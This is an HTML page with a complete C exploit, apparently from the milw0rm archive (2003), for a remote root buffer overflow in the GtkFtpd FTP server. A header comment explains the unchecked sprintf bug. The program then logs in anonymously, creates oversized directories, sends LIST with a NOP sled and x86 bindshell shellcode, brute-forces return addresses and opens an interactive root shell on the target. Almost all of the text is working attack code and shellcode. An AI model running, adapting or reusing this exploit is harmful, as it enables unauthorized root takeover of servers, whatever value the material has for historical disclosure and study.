<html>
<head>
<title>GtkFtpd 1.0.4 Remote Root Buffer Overflow Exploit</title>
<pre>
/**********************************************************
 * [ gtkftpd[v1.0.4(and below)]: remote root buffer overflow exploit. ]
 * 
 * by: vade79/v9 v9 at fakehalo.deadpig.org (fakehalo/realhalo) 
 * 
 * Url: 
 * http://gtkftpd.sourceforge.net/ 
 * 
 * GtkFtpd, versions v1.0.4 and below(as of this time), contain a 
 * remotely exploitable buffer overflow. the overflow occurs when 
 * GtkFtpd allocates the appropriate amount of memory to hold a 
 * filename or directory(256 bytes), but does not account for the 
 * date/user/stat prefix(~40 bytes) it prepends to the buffer. 
 * 
 * When exploited, things are made easier due to the fact that 
 * GtkFtpd does not chroot() or drop its root privileges(as are 
 * required to run the program itself) while running. And one step 
 * more easier because when the buffer is overflown it is in a child 
 * process, making it possible to brute force(not crash). 
 * 
 * Requirements to exploit: 
 * - A valid account. (user/pass, anonymous will do) 
 * - A writable directory. (usually gtkftpd makes any dir writable) 
 * 
 * Usage: 
 * # cc xgtkftpd.c -o xgtkftpd 
 * # ./xgtkftpd [-Psupcbanrd] -h hostname 
 * *
 * Exploit workings(ftp commands): 
 * MKDIR &lt;large name/causes overflow&gt; 
 * LIST -&lt;shellcode&gt; (where the overflow occurs) 
 * 
 * The exploitable code itself is found in src/sys_cmd.c: 
 * 12:#define BUF_SIZE 256 
 * 21:char buf[BUF_SIZE]; 
 * 57:sprintf(buf, &quot;%s\t%s&quot;, perm_date_siz, entr-&gt;d_name); 
 * 
 * Note: 
 * Make sure the directory used to &quot;LIST&quot; does not already contain 
 * any large filenames or directories, as the first overly long one 
 * to list will cause the overflow. (which will fail the exploit) 
 * *
 * (should work out of the box on generic linux, tested on rh7.1. 
 * squished, un-tab'd, un-space'd, exploit code; just how i like it.) 
 **********************************************************/
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;signal.h&gt;
#include &lt;getopt.h&gt;
#include &lt;ctype.h&gt;
#include &lt;time.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
/* default definitions, change at will. */
#define DFLUSER &quot;anonymous&quot; /* no argument, default username. */
#define DFLPASS &quot;null@null.com&quot; /* no argument, default password. */
#define DFLDIR &quot;/incoming&quot; /* no argument, default +w directory. */
#define DFLCLM 80 /* default screen width to use. */
#define DFLADDR 0xbffffffa /* base brute address. */
#define TIMEOUT 10 /* connection timeout. */
static char x86_exec[]= /* bindshell(sport), modded from netric. */
 /* port defined in byte 20, and 21; in a 'short' cast form. */
 &quot;\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31&quot;
 &quot;\xd2\x52\x66\x68\x00\x00\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89&quot;
 &quot;\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80&quot;
 &quot;\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd&quot;
 &quot;\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f&quot;
 &quot;\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
/* protos/functions. */
char *getdir(unsigned int);
char *getbdir(void);
char *getcode(void);
void filter_text(char *);
void ftp_printf(int,char *,...);
void ftp_clean(int);
void ftp_read(int);
void ftp_parse(int);
void ftp_connect(void);
void getshell(int,unsigned int);
void printe(char *,short);
void usage(char *);
void sig_ctrlc(){printe(&quot;user aborted.&quot;,1);}
void sig_alarm(){printe(&quot;alarm/timeout hit.&quot;,1);}
void sig_pipe(){printe(&quot;connection closed/failed.&quot;,1);}
/* globals. (ease of use throughout) */
unsigned short align=2; /* probably will never need to be otherwise. */
unsigned short port=21; /* generic ftp daemon port. */
unsigned short sport=7979; /* generic bindshell port. */
unsigned short reverse=0; /* go upward, instead of downward */
unsigned short no_io=0; /* do not show traffic. */
unsigned int attempts=100; /* number of times to brute. */
unsigned int columns=80; /* generic screen width. */
unsigned int ftp_i=0; /* Nth time read ftp socket. */
unsigned int baseaddr=DFLADDR; /* base address. (again) */
char *host; /* hostname/target, a must have. */
char *user; /* username to use. */
char *pass; /* password to use. */
char *writedir; /* need a writable directory. */
char *basedir; /* gets filled in later. */
/* program start. */
int main(int argc,char **argv){
 int chr=0;
 printf(&quot;[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow&quot;
 &quot; exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n&quot;);
 /* set the chomp point, filter long lines. */
 if(getenv(&quot;COLUMNS&quot;))columns=atoi(getenv(&quot;COLUMNS&quot;));
 if(7&gt;columns||columns&gt;256)columns=DFLCLM;
 while((chr=getopt(argc,argv,&quot;h:P:s:u:p:c:b:a:n:rd&quot;))!=EOF){
  switch(chr){
   case 'h':
    if(!host&amp;&amp;!(host=(char *)strdup(optarg)))
     printe(&quot;main(): allocating memory failed.&quot;,1);
    break;
   case 'P':
    port=atoi(optarg);
    break;
   case 's':
    sport=atoi(optarg);
    break;
   case 'u':
    if(!user&amp;&amp;!(user=(char *)strdup(optarg)))
     printe(&quot;main(): allocating memory failed.&quot;,1);
    break;
   case 'p':
    if(!pass&amp;&amp;!(pass=(char *)strdup(optarg)))
     printe(&quot;main(): allocating memory failed.&quot;,1);
    break;
   case 'c':
    if(!writedir&amp;&amp;!(writedir=(char *)strdup(optarg)))
     printe(&quot;main(): allocating memory failed.&quot;,1);
    break;
   case 'b':
    sscanf(optarg,&quot;%x&quot;,&amp;baseaddr);
    break;
   case 'a':
    align=atoi(optarg);
    break;
   case 'n':
    attempts=atoi(optarg);
    break;
   case 'r':
    reverse=1;
    break;
   case 'd':
    no_io=1;
    break;
   default:
    usage(argv[0]);
    break; 
  }
 }
 if(!host)
  usage(argv[0]);
 /* fill in the blanks, or out of bounds. */
 if(!user)user=DFLUSER;
 if(!pass)pass=DFLPASS;
 if(!writedir)writedir=DFLDIR;
 if(!baseaddr)baseaddr=DFLADDR;
 if(align&gt;3)align=2;
 if(!((sport&amp;0xff00)&gt;&gt;8)||!(sport&amp;0x00ff)){
  printf(&quot;[!] shell port defined contains null byte(s), using default.\n&quot;);
  sport=7979; /* back to default. */
 }
 /* change the bindshell port. */
 x86_exec[20]=(sport&amp;0xff00)&gt;&gt;8;
 x86_exec[21]=(sport&amp;0x00ff);
 /* verbose. */
 printf(&quot;[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute&quot;
 &quot; start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: &quot;
 &quot;%d, bindshell port: %d.\n\n&quot;,host,port,user,pass,writedir,baseaddr,
 align,(!reverse?&quot;downward&quot;:&quot;upward&quot;),attempts,sport);
 signal(SIGINT,sig_ctrlc); /* explained/pretty exit. */
 signal(SIGPIPE,sig_pipe); /* handle abnormal disconnects. */
 ftp_connect(); /* do the magic, brute force. */
 printe(&quot;brute force exhausted, failed.&quot;,0);
 exit(0);
}
char *getdir(unsigned int offset){
 unsigned int i=0;
 char *buf;
 /* 256 will fail; 255 or less. */
 if(!(buf=(char *)malloc(255+1)))
  printe(&quot;getdir(): allocating memory failed.&quot;,1);
 memset(buf,0x0,255+1);
 if(align)memset(buf,'x',align);
 for(i=align;i&lt;252;i+=4){
 if(!reverse)*(long *)&amp;buf[i]=(baseaddr-offset);
 else *(long *)&amp;buf[i]=(baseaddr+offset);
 }
 return(buf);
}
char *getbdir(void){
 char *buf;
 time_t ttt;
 struct tm *ttm;
 if(!(buf=(char *)malloc(32+1)))
  printe(&quot;getbdir(): allocating memory failed&quot;,1);
 ttt=time(NULL);
 ttm=localtime(&amp;ttt);
 strftime(buf,32,&quot;tmp_%H:%M:%S_%d-%m-%Y&quot;,ttm);
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(512+1)))
  printe(&quot;getcode(): allocating memory failed&quot;,1);
 memset(buf,0x90,(512-strlen(x86_exec)));
 memcpy(buf+(512-strlen(x86_exec)),x86_exec,strlen(x86_exec));
 return(buf);
}
void filter_text(char *ptr){
 unsigned int i=0;
 for(i=0;i&lt;strlen(ptr);i++){
  /* keep it short and sweet. */
  if(i&gt;=(columns-3)){
   ptr[i--]=0x0;
   ptr[i--]='.';
   ptr[i--]='.';
   ptr[i]='.';
  }
  /* don't make \r or \n a '?'. */
  else if(ptr[i]=='\r'||ptr[i]=='\n')ptr[i]=0x0;
  /* don't ugly the local terminal. */
  else if(!isprint(ptr[i]))ptr[i]='?';
 }
 return;
}
void ftp_printf(int sock,char *fmt,...){
 char *buf;
 va_list ap;
 if(!(buf=(char *)malloc(1024+1)))
  printe(&quot;ftp_printf(): allocating memory failed.&quot;,1);
 memset(buf,0x0,1024+1);
 va_start(ap,fmt);
 vsnprintf(buf,1024,fmt,ap);
 va_end(ap);
 write(sock,buf,strlen(buf)); /* write it, then mod it for display. */
 filter_text(buf);
 if(!no_io)
  printf(&quot;-&gt; %s\n&quot;,buf);
 free(buf);
 return;
}
void ftp_clean(int sock){
 ftp_printf(sock,&quot;CWD ..\r\n&quot;);
 ftp_read(sock);
 ftp_printf(sock,&quot;RMD %s\r\n&quot;,basedir);
 ftp_read(sock);
 ftp_printf(sock,&quot;QUIT\r\n&quot;);
 ftp_read(sock);
 return;
}
void ftp_read(int sock){
 char *buf;
 if(!(buf=(char *)malloc(1024+1)))
  printe(&quot;ftp_read(): allocating memory failed.&quot;,1);
 memset(buf,0x0,1024);
 read(sock,buf,1024);
 filter_text(buf);
 if(!no_io)
  printf(&quot;&lt;- %s\n&quot;,buf);
 /* some initial reply checking, not too much. */
 if(!ftp_i)
  if(!strstr(buf,&quot;GtkFTPd&quot;))
   printe(&quot;this exploit is only for GtkFTPd, failed.&quot;,1);
 if(ftp_i==2)
  if(strncmp(buf,&quot;230&quot;,3))
   printe(&quot;invalid username/password, failed.&quot;,1);
 if(ftp_i==3)
  if(strncmp(buf,&quot;250&quot;,3))
   printe(&quot;invalid writable directory, failed. (try \&quot;/\&quot;)&quot;,1);
 free(buf);
 ftp_i++; /* increase the response identifier. */
 return;
}
void ftp_parse(int sock){
 unsigned int offset=0;
 ftp_read(sock); /* get the banner. */
 ftp_printf(sock,&quot;USER %s\r\n&quot;,user);
 ftp_read(sock);
 ftp_printf(sock,&quot;PASS %s\r\n&quot;,pass);
 ftp_read(sock);
 ftp_printf(sock,&quot;CWD %s\r\n&quot;,writedir);
 ftp_read(sock);
 basedir=getbdir(); /* tmp dir of our own to use. */
 ftp_printf(sock,&quot;MKD %s\r\n&quot;,basedir);
 ftp_read(sock);
 ftp_printf(sock,&quot;CWD %s\r\n&quot;,basedir);
 ftp_read(sock);
 while(offset&lt;(attempts*400)){ /* if it hasn't yet, it's not going to. */
  /* slight null-byte/CR check, only needs to check the last byte. */
  if((!reverse&amp;&amp;!((baseaddr-offset)&amp;0xff))||(reverse&amp;&amp;!((baseaddr+offset)
  &amp;0xff))||(!reverse&amp;&amp;((baseaddr-offset)&amp;0xff)=='\n')||(reverse&amp;&amp;
  ((baseaddr+offset)&amp;0xff)=='\n')){
   printf(&quot;[!] brute address contains null-byte/CR, increasing offset &quot;
   &quot;by one byte.\n&quot;);
   offset++; /* one byte off if reversed won't hurt here. (401) */
  }
  /* make the evil oversized directory. (255 or less bytes) */
  ftp_printf(sock,&quot;MKD %s\r\n&quot;,getdir(offset));
  ftp_read(sock);
  /* date+directory exceeds 256 byte buffer, the exploit. */
  sleep(1); /* delay insurance. */
  ftp_printf(sock,&quot;LIST -%s\r\n&quot;,getcode());
  /* nothing to read here, and gtkftpd processes (the exploit) */
  /* before the ftp list connection is made, making it */
  /* pointless to view the list. */
  sleep(1); /* delay insurance, again, just to be sure. */
  /* delete directory, multiples will cause failure(s). */
  ftp_printf(sock,&quot;RMD %s\r\n&quot;,getdir(offset));
  ftp_read(sock);
  getshell(sock,offset);
  offset+=400; /* always at least 400 nops in a row, in shellcode. */
 }
 ftp_clean(sock);
 close(sock);
 return;
}
void ftp_connect(void){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(host))){
  if(!(t=gethostbyname(host)))
   printe(&quot;couldn't resolve hostname.&quot;,1);
  memcpy((char*)&amp;s.sin_addr,(char*)t-&gt;h_addr,sizeof(s.sin_addr));
 }
 printf(&quot;[*] attempting to connect: %s:%d.\n&quot;,host,port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&amp;s,sizeof(s)))
  printe(&quot;gtkftpd connection failed.&quot;,1);
 alarm(0);
 printf(&quot;[*] connected successfully: %s:%d.\n&quot;,host,port);
 ftp_parse(sock);
 return;
}
void getshell(int ftpsock,unsigned int offset){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe(&quot;getshell(): socket() failed.&quot;,1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(host))){
  if(!(he=gethostbyname(host)))
   printe(&quot;getshell(): couldn't resolve.&quot;,1);
  memcpy((char *)&amp;sa.sin_addr,(char *)he-&gt;h_addr,sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(sport);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf(&quot;[*] checking for bindshell: %s:%d. (0x%.8x)\n&quot;,host,sport,
 (!reverse?(baseaddr-offset):(baseaddr+offset)));
 if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa))){
  printf(&quot;[!] connection failed: %s:%d.\n&quot;,host,sport);
  close(sock); /* don't want fd's to fill up. */
  alarm(0);
  return;
 }
 alarm(0);
 printf(&quot;[*] successfully connected: %s:%d.\n&quot;,host,sport);
 printf(&quot;[*] attempting to cleanup leftover directory(s).\n&quot;);
 ftp_clean(ftpsock);
 close(ftpsock);
 printf(&quot;[*] entering remote shell. (%s:%d)\n\n&quot;,host,sport);
 signal(SIGINT,SIG_IGN);
 write(sock,&quot;cd /;uname -a;id\n&quot;,18);
 while(1){
  FD_ZERO(&amp;fds);
  FD_SET(0,&amp;fds);
  FD_SET(sock,&amp;fds);
  if(select(sock+1,&amp;fds,0,0,0)&lt;1)
   printe(&quot;getshell(): select() failed.&quot;,1);
  if(FD_ISSET(0,&amp;fds)){
   if((r=read(0,buf,4096))&lt;1)
    printe(&quot;getshell(): read() failed.&quot;,1);
   if(write(sock,buf,r)!=r)
    printe(&quot;getshell(): write() failed.&quot;,1);
  }
  if(FD_ISSET(sock,&amp;fds)){
   if((r=read(sock,buf,4096))&lt;1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 printf(&quot;[!] error: %s\n&quot;,err);
 if(e)exit(1);
 return;
}
void usage(char *name){
 printf(&quot; usage: %s [options] -h hostname\n\n options:\n&quot;
 &quot; -h &lt;string&gt;\tdefines the target host/ip.\t(REQUIRED)\n&quot;
 &quot; -P &lt;number&gt;\tdefines the target port.\t(%d)\n&quot;
 &quot; -s &lt;number&gt;\tdefines the bindshell port.\t(%d)\n&quot;
 &quot; -u &lt;string&gt;\tdefines the username.\t\t(\&quot;%s\&quot;)\n&quot;
 &quot; -p &lt;string&gt;\tdefines the password.\t\t(\&quot;%s\&quot;)\n&quot;
 &quot; -c &lt;string&gt;\tdefines the writable directory.\t(\&quot;%s\&quot;)\n&quot;
 &quot; -b &lt;string&gt;\tdefines the base brute address.\t(0x%.8x)\n&quot;
 &quot; -a &lt;number&gt;\tdefines the alignment.\t\t(%d)\n&quot;
 &quot; -n &lt;number&gt;\tdefines the number of attempts.\t(%d)\n&quot;
 &quot; -r\t\tgo upward in memory, instead of downward.\n&quot;
 &quot; -d\t\tdo not show verbose ftp in/out traffic.\n\n&quot;,
 name,port,sport,DFLUSER,DFLPASS,DFLDIR,DFLADDR,align,attempts);
 exit(0);
}

// milw0rm.com [2003-08-28]
</pre>
</html>

